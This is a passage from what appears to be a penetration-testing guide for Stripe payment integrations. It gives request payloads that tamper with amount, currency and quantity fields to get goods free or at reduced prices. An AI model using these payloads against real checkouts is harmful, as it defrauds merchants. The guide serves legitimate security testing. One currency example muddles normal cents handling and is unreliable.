<stripe_payment_flaws_guide>
<title>STRIPE PAYMENT SECURITY TESTING</title>

<critical>Stripe payment integrations require careful testing for payment bypass, webhook manipulation, checkout abuse, price tampering, idempotency issues, and race conditions. Focus on client-side validation bypass, webhook verification, and race conditions in payment flows.</critical>

<scope>
- Payment bypass techniques
- Webhook signature manipulation and replay
- Checkout session abuse
- Price and amount manipulation
- Idempotency key exploitation
- Race conditions in payment flows
- Refund and dispute abuse
- Subscription manipulation
- Payment method tokenization issues
</scope>

<methodology>
1. Map all payment flows (checkout, subscriptions, invoices, transfers)
2. Identify client-side vs server-side validation
3. Test amount/price manipulation vectors
4. Analyze webhook handling and verification
5. Test idempotency and race conditions
6. Examine refund and cancellation logic
7. Probe subscription upgrade/downgrade flows
</methodology>

<payment_bypass>
<amount_manipulation>
{% raw %}
# Client-side amount changes

# Checkout Session API (server-side - secure)
# POST https://api.stripe.com/v1/checkout/sessions
{
  "line_items": [{
    "price": "price_xxxxx",  // Server-controlled price ID
    "quantity": 1
  }]
}

# Payment Intent API (common mistake - client-controlled)
# POST https://api.stripe.com/v1/payment_intents
{
  "amount": 1000,  // Client sends amount - vulnerable!
  "currency": "usd"
}

# Attack: Intercept and modify amount
# Original request:
POST /api/create-payment-intent
{"amount": 10000, "item": "premium_plan"}

# Modified request:
POST /api/create-payment-intent
{"amount": 1, "item": "premium_plan"}

# Result: Purchased premium plan for $0.01
{% endraw %}
</amount_manipulation>

<currency_manipulation>
{% raw %}
# Currency code manipulation

# Original:
{"amount": 10000, "currency": "usd"}  // $100.00

# Attack 1: Change currency
{"amount": 10000, "currency": "jpy"}  // ¥10000 = ~$75

# Attack 2: Use low-value currency
{"amount": 10000, "currency": "clp"}  // CLP 10000 = ~$12

# Attack 3: Currency confusion
{"amount": 100, "currency": "usd"}
# But server interprets as cents without validation
# Result: $1.00 instead of $100.00

# Attack 4: Decimal vs non-decimal currencies
# JPY has no decimal places
# 1000 JPY = ¥1000
# But USD: 1000 = $10.00
# Confusion can lead to amount errors
{% endraw %}
</currency_manipulation>

<quantity_manipulation>
{% raw %}
# Manipulate item quantities

# Checkout session
{
  "line_items": [{
    "price": "price_1JqX...",
    "quantity": 1  // Change to negative or zero
  }]
}

# Attack 1: Negative quantity
{"quantity": -1}
# May cause credit/refund instead of charge

# Attack 2: Zero quantity
{"quantity": 0}
# Free checkout

# Attack 3: Decimal quantity (if not validated)
{"quantity": 0.01}
# 1% of price

# Attack 4: Extremely large quantity
{"quantity": 999999999}
# May cause integer overflow or DoS
{% endraw %}
</quantity_manipulation>

